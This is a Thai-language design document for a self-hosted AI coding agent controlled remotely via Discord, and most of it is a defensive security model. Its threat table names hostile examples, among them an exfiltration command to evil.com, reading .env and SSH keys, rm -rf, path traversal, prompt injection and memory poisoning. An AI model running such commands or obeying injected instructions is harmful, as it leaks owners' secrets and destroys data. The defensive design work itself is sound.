# System Design — Personal AI Coding Agent

> AI coding agent ที่รันในเครื่อง (local-first) · จำงานข้าม session · เก็บความรู้เป็น knowledge graph ใน Obsidian · รับคำสั่งผ่าน Telegram bot · เรียกไฟล์และจัดการเครื่องได้
>
> เวอร์ชันเอกสาร: **v3.1** · Stack: TypeScript + Vercel AI SDK + Telegraf + Obsidian vault
>
> **Changelog v3.1 (Phase 3, 4, 5 - Complete Integration):** สำเร็จการพัฒนาระบบความปลอดภัยและการเชื่อมต่อระยะไกลอย่างสมบูรณ์แบบ:
> - **Secret Broker & Taint Tracking**: แยก API Keys ออกจาก process.env และเซนเซอร์ข้อมูลความลับจาก Log/Output, พร้อมระบบตรวจจับ Taint ของข้อมูลนำเข้าเพื่อบังคับใช้งานการยืนยันตัวตน 2FA
> - **Hash-chained Audit Logs & Kill Switch**: เพิ่มระบบ Audit Log แบบต่อรหัสผ่านแบบสายโซ่ และระบบ Kill Switch ฉุกเฉินเมื่อเกิดเหตุภัยคุกคาม
> - **Telegram Bot Gateway & Out-of-band TOTP**: พัฒนาระบบบอทรับคำสั่งจาก Telegram โดยมีการคุมสิทธิ์ Owner และการยืนยันสิทธิ์ Mutate ผ่านรหัส 2FA TOTP (Google Authenticator)
> - **Supervisor Watchdog**: เพิ่มตัวควบคุม Daemon ด้วย Heartbeat และการกู้คืนระบบจากการแครชแบบอัตโนมัติ (Exponential Backoff)
> - **Context Compaction**: ระบบบีบอัดบทสนทนาอัจฉริยะเมื่อโทเค็นเต็มโดยใช้ LLM และรักษาความถูกต้องของ Tool Call/Result
>
> **Changelog v2.0 (Phase 2 - Knowledge Graph):** สำเร็จ Phase 2 ปรับระบบความจำแบบ Graph และเชื่อมต่อ Obsidian vault (ผ่าน remember และ recall tools) พร้อมตั้งค่าให้ DeepSeek เป็นโมเดลหลักเริ่มต้น โดยรองรับระบบสลับโมเดลอื่น ๆ ได้ในระดับโครงสร้าง
>
> **Changelog v1.2 (model adjustments):** ระงับการใช้งาน Google Gemini ชั่วคราวเนื่องจากปัญหาเครดิตบัญชีหมดอายุ ย้ายโมเดลตั้งต้นหลัก (default) ไปใช้ DeepSeek (API) และเพิ่มการรองรับ Anthropic Claude เป็นโมเดลทางเลือก
>
> **Changelog v1.1 (security hardening pass):** ปิดช่องโหว่เชิงตรรกะของ approval gate (เพิ่ม out-of-band 2nd factor), ยกระดับ §9 เป็น OS-level isolation + defense-in-depth (assume-breach), เพิ่ม audit log / kill-switch / memory-poisoning defense, แก้บั๊กสถาปัตยกรรม (per-session lock, compaction pairing, per-model token window, secret redaction), และจัด roadmap ให้ของ critical มาก่อน remote — ดู §9, §10, §12

---

## 1. Requirements

### 1.1 Functional (ระบบต้องทำอะไรได้)

| # | ความสามารถ | รายละเอียด |
|---|---|---|
| F1 | ตอบคำถามทั่วไป | LLM ตอบใน Discord เหมือน chatbot |
| F2 | เรียก/อ่านไฟล์ในเครื่อง | `read_file`, `glob`, `grep` ในขอบเขตที่อนุญาต |
| F3 | จัดการเครื่อง | `run_bash`, `write_file`, `edit_file` (มี approval) |
| F4 | จำงานข้าม session | โหลดบทสนทนาเก่า + context กลับมาเมื่อเริ่มใหม่ |
| F5 | เก็บความรู้เป็น graph | เขียนโน้ต `.md` มี `[[wikilink]]` ลง Obsidian vault |
| F6 | สลับ LLM ได้ | Claude / Gemini / DeepSeek / Hermes (local) |
| F7 | รับคำสั่งจากระยะไกล | ผ่าน Discord bot จากมือถือ/ที่ไหนก็ได้ |
| F8 | รันค้าง 24/7 | เป็น daemon, auto-restart เมื่อ crash |

### 1.2 Non-functional (คุณภาพ)

| ด้าน | เป้าหมาย |
|---|---|
| **Security** | **ลำดับความสำคัญสูงสุด** — ดูข้อ 9. Discord = remote trigger ของ RCE บนเครื่อง |
| Privacy | option รัน LLM ในเครื่องล้วน (Ollama) ข้อมูลไม่ออกเน็ต |
| Latency | ตอบเริ่ม stream ใน < 3s (API) / ตาม VRAM (local) |
| Cost | คุม budget ต่อ session, local model = ฟรี |
| Availability | single-user, ไม่ต้อง HA; auto-restart พอ |
| Maintainability | layer แยกชัด, tool เพิ่มได้โดยไม่แตะ core |

### 1.3 Constraints

- **คนเดียวพัฒนา + คนเดียวใช้** → ไม่ต้อง multi-tenant, ไม่ต้อง scale แนวนอน
- **Stack ที่ถนัด**: Node.js / TypeScript
- **เครื่อง dev**: Windows 10 (daemon ต้องรองรับ) + อาจมีเครื่อง Linux
- **Timeline**: ทำเป็น phase (ดูข้อ 12)

### 1.4 Out of scope (ตัดทิ้งในเวอร์ชันนี้)

- Multi-user / auth ของผู้ใช้หลายคน
- GUI automation (ขยับเมาส์/อ่านหน้าจอ) — เลื่อนไป future
- High availability / clustering
- Web crawling อัตโนมัติแบบ scale

---

## 2. High-Level Design

### 2.1 Layer architecture

```
┌────────────────────────────────────────────────────────────┐
│ CHANNEL LAYER         Discord bot │ Terminal REPL (dev)      │
│                       └ รับ input, ส่ง reply กลับ            │
├────────────────────────────────────────────────────────────┤
│ GATEWAY LAYER         Auth gate │ Session router │ Daemon    │
│                       └ ★ ด่านความปลอดภัยด่านแรก            │
├────────────────────────────────────────────────────────────┤
│ AGENT CORE            Loop · Context assembler · Compaction  │
│                       └ หัวใจ: LLM → tool → feed → ตอบจบ     │
├────────────────────────────────────────────────────────────┤
│ CAPABILITY LAYER                                             │
│   ├ Tools       fs · shell · memory tools                    │
│   ├ Safety      Approval · CWD-scope · Sandbox · Injection   │
│   ├ Provider    Claude · Gemini · DeepSeek · Hermes (abstr.) │
│   └ Memory      Session store + Obsidian vault adapter       │
├────────────────────────────────────────────────────────────┤
│ PERSISTENCE LAYER                                            │
│   ├ ~/.agent/sessions/   บทสนทนาดิบ (JSON, ต่อ cwd)         │
│   ├ ~/.agent/gateway/    token, task ledger                  │
│   └ <vault>/*.md          knowledge graph (Obsidian)         │
└────────────────────────────────────────────────────────────┘
```

### 2.2 Deployment topology (โหมด local + Discord)

```
   มือถือ/โน้ตบุ๊ก (ที่ไหนก็ได้)
        │  พิมพ์คำสั่งใน Discord
        ▼
   ┌─────────────┐
   │  Discord    │  (transport ผ่าน internet)
   └──────┬──────┘
          │ WebSocket gateway event
          ▼
╔═══════ เครื่องของคุณ (daemon รันค้าง) ════════════════╗
║  discord.js listener                                  ║
║     └─► ① AUTH: author.id === OWNER_ID ? ─ไม่ใช่→ ทิ้ง ║
║           │ ใช่                                        ║
║           ▼                                            ║
║  Agent Core (loop)                                     ║
║     ├─► LLM: Ollama @ localhost:11434  (หรือ cloud API)║
║     ├─► Tools: fs / bash / memory   ──② APPROVAL gate  ║
║     └─► Memory: sessions/ + vault/*.md                 ║
║           │                                            ║
║           └─► reply ──────────────────────────────────╫─► กลับ Discord
╚════════════════════════════════════════════════════════╝
```

**หลักการ:** ทุกอย่างประมวลผลในเครื่อง สิ่งเดียวที่ออกเน็ตคือ Discord transport (และ LLM API ถ้าไม่ใช้ local)

---

## 3. Component Breakdown

### 3.1 Channel Layer

**Discord adapter** (`discord.js`)
- เชื่อม Discord Gateway (WebSocket) รับ event `messageCreate`
- กรอง bot ตัวเอง, แปลง message → `AgentRequest`
- ส่ง reply กลับ (ตัด 2000 ตัวอักษรตาม limit Discord, split ถ้ายาว)
- รองรับ typing indicator ระหว่าง agent คิด

**Terminal REPL** (dev/fallback)
- ใช้ตอนพัฒนา/debug โดยไม่ต้องผ่าน Discord
- โค้ด core เดียวกัน ต่าง channel เท่านั้น

### 3.2 Gateway Layer

| Component | หน้าที่ |
|---|---|
| **Auth gate** | เช็ก owner ID ทุก message — ดู §9.2 |
| **Session router** | map Discord channel/DM → session id |
| **Daemon supervisor** | pm2 / systemd / Task Scheduler — รันค้าง + restart |
| **Task ledger** | คิวงาน + log การรัน (เผื่อ schedule/async ในอนาคต) |

### 3.3 Agent Core

```
runAgent(request):
  await sessionLock(sessionId)            ← ★ serialize ต่อ session (§3.5) — กัน lost update
  try:
    messages = loadSession(sessionId) + request
    system   = buildSystemPrompt(memory, vaultContext, tools)
    stepBudget = MAX_STEPS               ← hard cap tool-calls/turn (§9.6 rate-limit)
    loop:
      res = streamText({ model, system, tools, messages })
      stream text → channel
      messages.push(assistant)
      if res.finishReason != 'tool-calls': break
      if --stepBudget <= 0: break        ← กัน runaway loop
      for each toolCall:
          tainted = contextHasTaint(messages)          ← §9.4 taint tracking
          if isMutate(tool) || tainted:
              decision = await approvalGate(tool, {tainted})  ← §9.3 (persisted, out-of-band)
              if decision != 'approved': push denyResult; continue
          result = redact(cap(runTool(tool)))          ← §5.3 try/catch + redact + truncate
          appendAuditLog(sessionId, tool, result)      ← §9.6 hash-chained
          messages.push(toolResult)
    if tokens > modelThreshold(model): messages = compact(messages)   ← §6.4 ต่อ model
    saveSession(sessionId, messages)     ← atomic temp+rename
  finally:
    releaseLock(sessionId)
```

4 หน้าที่:
- **Loop** — ขับ multi-step tool calling (`stepCountIs` ของ AI SDK) + hard step cap
- **Context assembler** — ประกอบ system prompt: project memory + vault context + tool defs
- **Compaction** — บีบ history เมื่อ token เกิน, ต่อ context window ของแต่ละ model (§6.4)
- **Concurrency guard** — per-session lock/queue (§3.5) กัน 2 ข้อความใน session เดียวกันทับกัน

### 3.4 Capability Layer — ดูข้อ 5–8

### 3.5 Concurrency & approval state (เพิ่ม v1.1)

- **Per-session lock/queue** — Discord ส่ง event เร็ว; 2 ข้อความใน channel เดียว → 2 `runAgent`
  พร้อมกัน atomic write กัน *corrupt* ได้แต่ไม่กัน *lost update*. serialize งานต่อ `sessionId`
  (in-memory mutex + queue; ข้าม channel ยังขนานกันได้). นี่เป็น **core วันแรก** ไม่ใช่เรื่อง scale
- **Approval = persisted state machine** — pending approval เขียนลง `~/.agent/gateway/pending/<nonce>.json`
  (ดู §9.3); ถ้า daemon restart ระหว่างรอ approve สถานะไม่หาย, และ loop ไม่ block message อื่นทั้งระบบ
  (รอเฉพาะ session ที่ค้าง)

---

## 4. Data Flow (end-to-end 1 รอบ)

```
1. user พิมพ์ "หา TODO ในโปรเจกต์ X แล้วสรุป" ใน Discord
2. listener รับ event → AUTH: owner? ✔
3. router → sessionId = channel:1234
4. core: load sessions/channel-1234.json + vault context
5. assemble system + history + tools → ส่ง Ollama
6. LLM: "ขอเรียก grep('TODO', 'X/')"  (finishReason=tool-calls)
7. grep = read-only → ไม่ต้อง approve → รัน → ได้ผล
8. feed ผลกลับ → LLM สรุป (finishReason=stop)
9. stream คำตอบกลับ Discord
10. (ระหว่างทาง LLM อาจเรียก remember → เขียนโน้ต [[X]] ลง vault)
11. token ยังไม่เกิน → ไม่ compact
12. save sessions/channel-1234.json
```

**กรณีมี mutate** (เช่น "ลบไฟล์ log"): ขั้น 7 เปลี่ยนเป็น → approval gate ถาม Discord → รอยืนยัน **TOTP** (out-of-band, §9.3) → ค่อยรัน

---

## 5. Tool System (API Contracts)

Tool = `{ schema, handler, mutate }` แยกนิยาม / การรัน / ระดับความเสี่ยง

### 5.1 Tool catalog

| Tool | Input | Mutate? | หมายเหตุ |
|---|---|---|---|
| `read_file` | `{path}` | ✗ | จำกัด cwd-scope |
| `glob` | `{pattern}` | ✗ | หาไฟล์ |
| `grep` | `{query, path}` | ✗ | ค้นเนื้อหา |
| `write_file` | `{path, content}` | ✓ | ต้อง approve |
| `edit_file` | `{path, old, new}` | ✓ | ต้อง approve |
| `run_bash` | `{cmd}` | ✓ | ต้อง approve + allowlist |
| `remember` | `{folder, title, content, links[]}` | ✓(vault) | เขียนโน้ต graph (§7) |
| `recall` | `{query}` | ✗ | ค้น vault |

### 5.2 Tool schema (ตัวอย่าง — รูปแบบเดียวกันทุกตัว)

```ts
{
  name: 'remember',
  description: 'บันทึกความรู้ลง knowledge graph เป็นโน้ต Markdown ที่เชื่อมกับโน้ตอื่นด้วย wikilink',
  inputSchema: z.object({
    folder:  z.enum(['Projects','Entities','Sessions','Learning']),
    title:   z.string(),
    content: z.string().describe('เนื้อหา markdown'),
    links:   z.array(z.string()).describe('ชื่อโน้ตที่ต้องเชื่อม เช่น ["Projects/myapp"]'),
  }),
}
```

### 5.3 Tool result contract

```ts
{ tool_call_id, content: string }   // ✗ throw — error ห่อเป็น "Error: ..." ส่งกลับให้ LLM แก้เอง
```

**v1.1 — result hardening (ก่อนป้อน content กลับ LLM ทุกครั้ง):**
- **Redact secrets** — กรอง pattern ที่เป็นความลับ (API key, token, `PRIVATE KEY`, `.env` values,
  `process.env` dump) ออกจาก tool output **และจาก error string** ก่อนป้อน LLM — กัน secret รั่ว
  เข้า conversation → vault → Discord
- **Cap size** — truncate result ที่ใหญ่เกิน (เช่น > 32 KB / N tokens) พร้อมหมายเหตุ `…truncated` —
  กัน token blowup + cost spike จากการอ่านไฟล์ใหญ่
- **Error = ข้อความสั้นปลอดภัย** — ไม่ส่ง stack trace / absolute path / internal detail กลับ LLM
  (LLM แก้เองได้จาก message ระดับสูง; รายละเอียดเต็มไปที่ audit log §9.6 เท่านั้น)

---

## 6. Data Models

### 6.1 Session (บทสนทนาดิบ)

```jsonc
// ~/.agent/sessions/<channelId>.json
{
  "id": "channel:1234",
  "cwd": "/home/jack/projects/myapp",   // memory แยกตาม project
  "createdAt": "2026-06-25T10:00:00Z",
  "messages": [
    { "role": "user", "content": "..." },
    { "role": "assistant", "content": [ {"type":"text"}, {"type":"tool-call"} ] },
    { "role": "tool", "content": [ {"type":"tool-result"} ] }
  ],
  "tokenEstimate": 8421,
  "rev": 12                              // v1.1: optimistic-lock counter — บันทึกเฉพาะถ้า rev ตรง
}
```
> **v1.1:** เขียนภายใต้ per-session lock (§3.5) + ตรวจ `rev` ก่อน save (กัน lost update);
> เขียนแบบ atomic temp+rename (§10) กัน corrupt

### 6.2 Knowledge note (1 ไฟล์ใน vault = 1 node)

```markdown
---
note_type: entity
created: 2026-06-25
source: "[[Sessions/2026-06-25-auth]]"
tags: [auth, security]
---
# JWT Auth Module

ใช้ใน [[Projects/myapp]] · ตัดสินใจที่ [[Decisions/use-rs256]]

up:: [[Entities/_Index]]
```
> `[[...]]` แต่ละอัน = 1 edge ใน graph · `up::` = กัน orphan node

### 6.3 Vault structure (PARA)

```
vault/
├── _Index.md           hub กลาง
├── Projects/           1 โฟลเดอร์ = 1 repo
│   └── _Index.md       (AI routing rules: เขียนอะไร เชื่อมไปไหน)
├── Entities/           canonical page ต่อ คน/concept ← hub ของ graph
├── Sessions/           log งานแต่ละครั้ง
├── Learning/           ความรู้ทั่วไป
└── Templates/
```

### 6.4 Compaction model

- **Trigger ต่อ model** — `tokenEstimate > modelThreshold(model)` ไม่ใช่ค่าคงที่ 120k เดียว
  เพราะ context window ต่างกันมาก: Claude ~200k / Gemini ~1M / local 8–32k. เก็บ threshold เป็น
  map ต่อ provider (เช่น 75% ของ window) — ใช้ค่าเดียวจะ overflow local model และเสีย context ฟรี ๆ ของ Gemini
- **กลยุทธ์:** prune `tool-result` เก่าก่อน → ถ้ายังเกิน ให้ LLM สรุป history เก่า เก็บ N turn ล่าสุดสด
- **★ prune เป็นคู่ (สำคัญ)** — ทุก `tool-call` ต้องมี `tool-result` คู่ของมัน; ถ้า prune result
  ทิ้งแต่เก็บ call ไว้ (หรือกลับกัน) provider จะ reject ทั้ง request. ต้องตัด/ย่อ **call+result เป็นคู่เสมอ**
- **tokenEstimate** — ใช้ tokenizer จริงต่อ provider ถ้าทำได้; ถ้าใช้ char-estimate ต้องเผื่อ safety
  margin (ประเมินต่ำ = overflow จริง)
- **ผลลัพธ์:** แทน history เก่าด้วย 1 ข้อความสรุป + turn ล่าสุด (ยังคงคู่ call/result ที่เหลือครบ)

---

## 7. Memory & Knowledge Graph

**หลักการ: Obsidian graph = Markdown + `[[wikilink]]` — ไม่ต้องมี DB**

```
Agent ──remember tool──► เขียน .md + wikilink ลง vault
                              │
   เครือข่ายเกิดจาก link ระหว่างไฟล์ ──► Obsidian render graph view ให้ฟรี
```

**กลไกที่ทำให้เป็น "เครือข่าย" ไม่ใช่กองไฟล์:**

| กลไก | กันปัญหา |
|---|---|
| **AI routing contract** (กฎใน `_Index.md` แต่ละโฟลเดอร์) | โน้ตมั่ว / ไม่เชื่อมกัน |
| **Merge, don't append** (ค้นของเดิมก่อนสร้างใหม่) | entity ซ้ำหลายเวอร์ชัน |
| **`up::` parent link** | orphan node ลอยนอก graph |
| **Entities folder** (รวม fact ของ concept หน้าเดียว) | ความรู้กระจัดกระจาย |

**ได้ของ 2 อย่างพร้อมกัน:** graph visualization (เปิด Obsidian) + cross-session memory ที่ค้นได้ (โน้ต = knowledge ถาวร)

---

## 8. Provider Layer

**Vercel AI SDK = provider abstraction → loop เดียวคุมทุกโมเดล**

| Provider | Package | Endpoint |
|---|---|---|
| Claude | `@ai-sdk/anthropic` | API |
| Gemini | `@ai-sdk/google` | API |
| DeepSeek | `@ai-sdk/deepseek` | API |
| **Hermes** | `@ai-sdk/openai-compatible` | **local: Ollama `localhost:11434/v1`** |

```ts
export const MODELS = {
  claude:   anthropic('claude-sonnet-4-6'),
  gemini:   google('gemini-2.5-pro'),
  deepseek: deepseek('deepseek-chat'),
  hermes:   ollama('hermes4'),         // openai-compatible → local
};
```
> **หมายเหตุ v1.1:** เช็ก model id ล่าสุดตอน implement (เวอร์ชันโมเดลเปลี่ยนเร็ว) · provider API keys
> ที่ใช้ที่นี่ **ต้องไม่อยู่ใน env ที่ agent/bash เอื้อมถึง** — โหลดผ่าน secret broker/process แยก (§9.5)
> เพื่อกัน prompt-injection ดูดคีย์ผ่าน `process.env`

**Routing ตาม task (optional):**

| งาน | โมเดลที่เหมาะ |
|---|---|
| Coding | Claude / DeepSeek |
| Context ยาว / multimodal | Gemini |
| งาน privacy-sensitive / offline | Hermes (local) |

---

## 9. Security Model ★ (ส่วนสำคัญที่สุด)

> **โจทย์หลักไม่ใช่ "ทำให้คุมเครื่องได้" (ง่ายอยู่แล้ว) — แต่คือ "ทำให้เปิดทิ้ง 24/7 ได้โดยไม่โดนยึดเครื่อง"** คุณกำลังสร้าง RCE backdoor ให้ตัวเองโดยตั้งใจ งานคือล็อกมันให้แน่น
>
> **โพสเจอร์ v1.1 = Maximum / assume-breach** — ออกแบบโดยสมมุติว่า "Discord/บัญชี/ช่องทาง chat ถูกยึดได้" แล้ว เครื่องยังต้องไม่โดนยึด การป้องกันจึง **ห้ามพึ่ง Discord channel เดียวเป็นทั้งด่าน auth และด่าน approval**

### 9.0 Security principles (กรอบคิด)

1. **Deny-by-default** — ทุก mutate ถูกปฏิเสธจนกว่าจะผ่านด่าน; read-only เท่านั้นที่ auto
2. **Defense-in-depth** — auth → approval → OS-isolation → audit ซ้อนกัน; ด่านใดด่านหนึ่งพังต้องมีด่านถัดไปรับ
3. **Least privilege** — daemon/bot/process ได้สิทธิ์น้อยที่สุดเท่าที่ทำงานได้
4. **Assume-breach** — สมมุติ Discord account/token ถูกยึดแล้ว; มาตรการสำคัญต้องมี factor ที่ **ไม่วิ่งผ่าน Discord**
5. **Tamper-evident** — ทุกการกระทำมี audit log ที่ลบ/แก้ย้อนหลังไม่ได้ (§9.6)
6. **Out-of-band approval** — high-risk action ยืนยันผ่านปัจจัยที่แยกจากช่องทางสั่งงาน (§9.3)

### 9.1 Threat model (STRIDE + residual risk)

| # | ภัยคุกคาม | หมวด | ผลกระทบ | มาตรการ | Residual risk |
|---|---|---|---|---|---|
| T1 | คนอื่นส่งข้อความหา bot | Spoofing | สั่งรันบนเครื่อง | Auth gate owner-ID (§9.2) | ต่ำ |
| T2 | **บัญชี/token Discord ถูกยึด** | Spoofing/Elevation | ยึดเครื่องเต็ม + กด approve เองได้ | **out-of-band TOTP (§9.3)** + bot least-priv + key ใน keychain (§9.2) | กลาง→ต่ำ (จำกัดที่ read-only จนกว่าจะ ARM ด้วย TOTP) |
| T3 | Prompt injection (เว็บ/ไฟล์สั่ง agent) | Tampering | agent รันคำสั่งอันตรายเอง | taint tracking + บังคับ approval (§9.4) | ต่ำ (mutate ติด approval เสมอ) |
| T4 | **Secret exfiltration** (`cat .env`, dump `process.env`, อ่าน `~/.ssh`) | Info-disclosure | API key/SSH key รั่ว | secret ออกนอก env ของ agent + redact output (§9.5) + OS-isolation ตัดสิทธิ์อ่าน | ต่ำ |
| T5 | Path traversal (`../../etc`) / symlink / TOCTOU | Tampering | อ่าน/เขียนนอกขอบเขต | realpath-after-open + reject symlink + OS-isolation (§9.5) | ต่ำ |
| T6 | คำสั่งทำลายล้าง (`rm -rf`) | Tampering | ข้อมูลหาย | approval + argv allowlist (§9.3) + restricted user | ต่ำ |
| T7 | **Supply-chain** (`npm install` postinstall = RCE) | Elevation | code แปลกปลอมรันด้วยสิทธิ์ daemon | `npm --ignore-scripts` + lockfile + argv allowlist (§9.5) | กลาง→ต่ำ |
| T8 | **Egress exfil** (`curl evil.com -d @secret`) | Info-disclosure | ขโมยข้อมูลออกเน็ต | egress deny/allowlist ใน sandbox (§9.5) | ต่ำ |
| T9 | **Memory poisoning** (injection เขียน fact เท็จลง vault) | Tampering | ชี้นำ session อนาคต (persistence) | quarantine vault-write ที่ tainted (§9.7) | กลาง |
| T10 | **daemon รันเป็น user หลัก** | Elevation | RCE ได้สิทธิ์เท่าคุณ (ssh, cookies, keychain) | dedicated low-priv user / container (§9.5) | ต่ำ |
| T11 | Approval replay / spoof reaction | Spoofing | อนุมัติคำสั่งผิดตัว | nonce + filter `reactor.id` + กัน add-then-remove (§9.3) | ต่ำ |

### 9.2 Auth & identity (ด่านที่ห้ามพัง)

```ts
// ด่านที่ 1 — owner-ID, เช็กทุก message ก่อนเข้า agent
if (msg.author.id !== OWNER_DISCORD_ID) return;        // ทิ้งเงียบ
// ด่านที่ 2 — สำหรับ mutate: ต้อง ARM ด้วย TOTP ก่อน (§9.3)
```

- เช็ก owner-ID ทุก message **ก่อน** เข้า agent; bot อยู่ใน **private server / DM เท่านั้น** ห้าม public
- **owner-ID อย่างเดียวไม่พอ (assume-breach)** — ถ้า token Discord ถูกขโมย attacker = owner ในสายตา bot
  ⇒ การ mutate ต้องมี **app-layer 2nd factor (TOTP)** เพิ่ม (§9.3)
- **Bot least-privilege** — ขอ Discord intents เท่าที่จำเป็น (read message + add reaction ใน 1 channel);
  ไม่ขอ admin/manage ใด ๆ
- **Secret storage** — Discord bot token + provider API keys เก็บใน **OS keychain / Windows DPAPI**
  ไม่ใช่ `.env` plaintext; ไฟล์ที่จำเป็นต้องเป็น `chmod 600`
- **ด่านนี้พัง = เครื่องพัง** — ต้องมี security test ครอบ (§9.8)

### 9.3 Approval gate (out-of-band, ไม่มีคนเฝ้า terminal)

รับคำสั่งจากระยะไกล ไม่มี terminal กด y/n → **deny-by-default + out-of-band confirm:**

```
mutate tool (หรือ context ที่ tainted §9.4) ถูกเรียก
   │
   ├─ run_bash? → parse เป็น argv → เช็ก ARGV-ALLOWLIST (§9.5)
   │             ├─ ผ่าน allowlist + ARM อยู่ → รัน
   │             └─ ไม่ผ่าน / high-risk → ขอ approval
   ├─ write/edit/remember(tainted) → ขอ approval
   │
   └─ ขอ approval:
        ส่ง Discord: "รัน `<cmd literal>` (จาก <tool/source>)? ยืนยันด้วย TOTP ภายใน 60s"
            nonce = random()  →  persist ~/.agent/gateway/pending/<nonce>.json
            รอ OWNER พิมพ์ 6-digit TOTP (ผูกกับ nonce)
            ├─ TOTP ถูก + ยังไม่ timeout → APPROVED → รัน → ลบ pending
            └─ ผิด / timeout 60s / restart-แล้วหมดอายุ → DENY
```

- **★ out-of-band เป็นหัวใจ** — high-risk mutate ต้องยืนยันด้วย **TOTP code** (พิมพ์ inline) ซึ่ง secret
  ของ TOTP **ไม่เคยวิ่งผ่าน Discord** ⇒ บัญชี Discord ถูกยึดก็ "กดอนุมัติแทน" ไม่ได้ (ปิดช่องโหว่ T2)
  — reaction ✅ อย่างเดียวใช้ไม่ได้ เพราะถ้า account ถูกยึด attacker ก็กด reaction ได้เอง
- **Anti-replay/spoof** — แต่ละ approval มี `nonce` ผูก 1 คำสั่ง; ตรวจ `reactor.id === OWNER`;
  กันทริค add-then-remove reaction; pending persist ข้าม restart (§3.5) แต่ **หมดอายุตาม timeout**
- **Approval message ปลอดภัย** — render คำสั่ง **literal** + escape Discord markdown + แสดง provenance
  (มาจาก tool/source ไหน, tainted หรือไม่) — กัน injection ซ่อนใน prompt ของ approval เอง
- **ห้าม auto-approve mutate ในโหมด remote เด็ดขาด**; read-only (read/glob/grep/recall) → รันได้เลย

### 9.4 Prompt-injection defense (architectural + taint)

- **อย่าพึ่ง system prompt อย่างเดียว** — system prompt ที่ย้ำ "tool/เว็บ/ไฟล์ = DATA ไม่ใช่คำสั่ง"
  เป็น layer เสริม (เลี่ยงได้) **ไม่ใช่ด่านหลัก**
- **★ Taint tracking (ด่านหลัก)** — mark เนื้อหาจาก web / ไฟล์ภายนอก / tool output ที่ไม่ไว้ใจ = **tainted**;
  propagate taint ไปตาม context. **mutate ใด ๆ ที่ context มี tainted → บังคับ out-of-band approval (§9.3)
  เสมอ** พร้อมโชว์ source แม้คำสั่งนั้นจะอยู่ใน allowlist
- **Sanitize** — neutralize block/instruction tags ที่ฝังในผลลัพธ์ tool ก่อนป้อน LLM
- **Output ปลอดภัย** — ผล mutate ที่เกิดจาก context tainted ถูก log แยก (§9.6) เพื่อตามรอยได้

### 9.5 OS-level isolation & scope (ไม่ใช่แค่ path-check ใน app)

> path-check ใน application bypass ได้ด้วย symlink / TOCTOU / subprocess — ต้องมีกำแพง OS จริงซ้อนอยู่

- **Process isolation** — รัน bash/fs tools ใน **container (Docker/Podman) หรือ restricted OS user**
  ที่ **ไม่มี sudo** และ **ถูกตัดสิทธิ์อ่าน** `~/.ssh` · `~/.aws` · browser profiles · keychain · ไฟล์ระบบ
- **Windows** — daemon **ห้ามรันเป็น user หลัก**; ใช้ **dedicated low-privilege local user** หรือ
  Windows Sandbox / AppContainer (สอดคล้อง constraint Windows 10 ใน §1.3)
- **Argv execution** — `run_bash` exec แบบ **argv array (`execFile`) ไม่ผ่าน shell string** →
  ฆ่า shell-metachar injection (`;` `|` `&&` `$()` backtick `>` `<`); ถ้าจำเป็นต้องมี shell ให้ reject metachars ก่อน
- **Allowlist บน argv ไม่ใช่ binary** — เช็กทั้ง argv: ปฏิเสธ flag อันตราย; mark
  `git` / `npm` / `docker` / `make` / `node` = **argument-sensitive** (spawn arbitrary process ได้);
  `npm` บังคับ `--ignore-scripts` (กัน postinstall RCE — T7); `cat`/`less` เข้าถึงเฉพาะ path ใน scope
- **Path scope แข็ง** — resolve path → **realpath หลัง open** → ยืนยันอยู่ใน workspace root;
  **reject symlink** ที่ชี้ออกนอก; ระวัง TOCTOU (เช็กแล้วเปิดทันที ไม่เว้นช่อง)
- **Egress control** — sandbox ของ bash = **network-deny** หรือ **egress allowlist** (firewall rule)
  เปิดเฉพาะ host ที่จำเป็น → กัน exfil (T8) และ reverse shell
- **Secret isolation** — provider API keys **ไม่อยู่ใน env ที่ agent/bash เอื้อมถึง**: ใช้ broker/proxy
  หรือ process แยกถือ key (agent คุยผ่าน IPC เฉพาะที่อนุญาต); ป้องกัน `process.env` dump → คีย์รั่ว (T4)
- **Gateway token** — 256-bit, `chmod 600`, เทียบด้วย `timingSafeEqual`

### 9.6 Audit log, kill-switch & rate-limit (เพิ่ม v1.1)

- **★ Append-only tamper-evident audit log** — บันทึก **ทุก tool call + approval decision + mutate**
  เป็น log ที่ **hash-chain** (แต่ละ entry มี hash ของ entry ก่อนหน้า) → แก้/ลบย้อนหลังจับได้;
  เก็บแยกจาก vault/session และ **ควร ship off-box** (append-only sink / external log) ให้ attacker
  ที่ยึดเครื่องลบร่องรอยไม่ได้. รายละเอียด error เต็ม (path/stack) ไปที่ log นี้เท่านั้น ไม่เข้า conversation
- **★ Kill switch (panic)** — คำสั่งหยุดฉุกเฉินที่สั่งได้ทั้ง **local และ remote**: revoke โหมด mutate
  ทันที + หยุด daemon. คู่กับ **incident playbook**: revoke Discord bot token → rotate provider keys →
  หยุด daemon → ตรวจ audit log
- **Rate-limit / runaway guard** — `MAX_STEPS` ต่อ turn (hard cap, §3.3), จำกัดจำนวน mutate ต่อหน้าต่างเวลา,
  crashloop backoff (§10) — กัน loop รัวและ abuse แม้เป็น owner

### 9.7 Memory-poisoning defense (เพิ่ม v1.1)

- vault เป็น **persistent memory** ⇒ fact เท็จที่ถูกฉีดเข้าไปจะ **ชี้นำ session อนาคตเงียบ ๆ** (T9)
- **Quarantine** — `remember` ที่ถูกเรียกภายใต้ context **tainted** (§9.4) → ต้องผ่าน approval (§9.3)
  และเขียนลงโซน/แท็ก `untrusted` แยก ไม่ปนกับ knowledge ที่ verified
- **Provenance ใน recall** — `recall` แสดงที่มาของโน้ต (source/แท็ก trust) เพื่อให้ทั้ง LLM และคนแยกแยะได้
- vault write ปกติ (ไม่ tainted) auto ได้เพราะ scope แค่ vault — แต่ tainted ต้องไม่ auto

### 9.8 Security test suite & trust model

**Security test suite = gate บังคับก่อน Phase 4 (remote)** — ต้องผ่านก่อนเปิด listener:
- auth-bypass (ปลอม author.id, ไม่มี TOTP แล้วพยายาม mutate)
- path-traversal corpus (`../`, symlink, absolute, UNC path บน Windows)
- prompt-injection corpus (ไฟล์/เว็บที่สั่ง agent ให้ exfil/mutate)
- allowlist-bypass (`npm run`, `git -c`, metachars, argv tricks)
- approval replay/spoof (nonce ซ้ำ, reaction จากคนอื่น)

**ตารางเลือก trust model (เริ่มจากต่ำสุดเสมอ):**

| Topology | Risk | Trade-off |
|---|---|---|
| Discord daemon 24/7 (mutate) | สูง (listener + RCE เปิดตลอด) | สะดวกสุด — ต้องครบ §9.2–9.6 |
